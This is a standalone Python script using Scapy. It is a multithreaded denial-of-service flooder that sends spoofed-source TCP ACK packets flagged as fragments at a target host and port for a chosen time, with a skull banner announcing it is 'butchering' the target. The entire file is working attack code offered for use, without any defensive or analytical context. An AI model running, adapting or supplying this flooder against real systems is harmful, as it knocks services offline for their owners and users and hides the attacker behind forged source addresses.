#!/usr/bin/env python3
import sys, time, threading, socket
import random, string, os
from scapy.all import *
from urllib.parse import urlparse

_abort = False

def _udp(_ip):
    while _abort == False:
        try:
            # Sequence number changes but ACK number does not
            _s = 1000
            _a = random.randint(1000, 10000)
            _p = RandShort()
            _fraud = ".".join(str(random.randint(0, 255)) for _ in range(4))
            for _ in range(random.randint(50, 150)):
                # ACK packets w/ MF (More Fragments) flag set / protocol six = TCP
                pkt = IP(dst=_ip, src=_fraud, flags="MF", proto = 6, frag = 0) / TCP(sport=_p, dport=int(sys.argv[2]), flags="A", seq=_s, ack=_a)
                send(pkt, verbose=False)
                _s +=1
                
                if _abort == True:
                    break
                  
            # complete the fragementations w/ a final ACK packet
            _s +=1
            pkt = IP(dst=_ip, src=_fraud) / TCP(sport=_p, dport=int(sys.argv[2]), flags="A", seq=_s, ack=_a)
            send(pkt, verbose=False)
        except KeyboardInterrupt:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = "http://" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')

def main():
    if len(sys.argv) != 5:
        sys.exit('\r\n Usage: <target> <port> <time> <threading>\r\n')
        
    if not os.geteuid() == 0:
        sys.exit('\r\n Script requires root elevation!\r\n')

    _domain, _ip = _rslv()
    global _abort

    os.system('clear')
    print('''
                    ██████████████            
                ████░░░░░░░░░░░░░░████        
              ██░░░░██░░░░░░░░░░██░░░░██      
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░██    
            ██░░░░░░██░░░░░░░░░░██░░░░░░██    
          ██░░██░░░░░░░░░░░░░░░░░░░░░░██░░██  
          ██░░░░░░░░██░░░░░░░░░░██░░░░░░░░██  
          ██░░██░░░░░░░░██░░██░░░░░░░░██░░██  
        ██░░░░░░░░░░▒▒▒▒░░░░░░▒▒▒▒░░░░░░░░░░██
        ██░░░░░░░░░░░░░░▒▒▒▒▒▒░░░░░░░░░░░░░░██
        ██░░░░░░████████░░▒▒░░████████░░░░░░██
        ██░░░░░░██    ██░░░░░░██    ██░░░░░░██
          ██░░░░░░████░░░░░░░░░░████░░░░░░██  
          ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██  
          ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██  
            ██░░░░░░▓▓░░░░░░░░░░▓▓░░░░░░██    
            ██░░░░▓▓░░░░██░░██░░░░▓▓░░░░██    
              ██▓▓░░██░░░░░░░░░░██░░▓▓██      
              ██░░░░░░░░██░░██░░░░░░░░██      
                ██░░░░░░░░░░░░░░░░░░██        
                  ██░░░░██░░██░░░░██          
                    ██░░░░░░░░░░██            
                      ██████████              
''')
    print(' Butchering ' + _ip + ":" + sys.argv[2] + ' for ' + sys.argv[3] + ' seconds...\r\n')

    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_udp, args=(_ip,))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == '__main__':
    main()
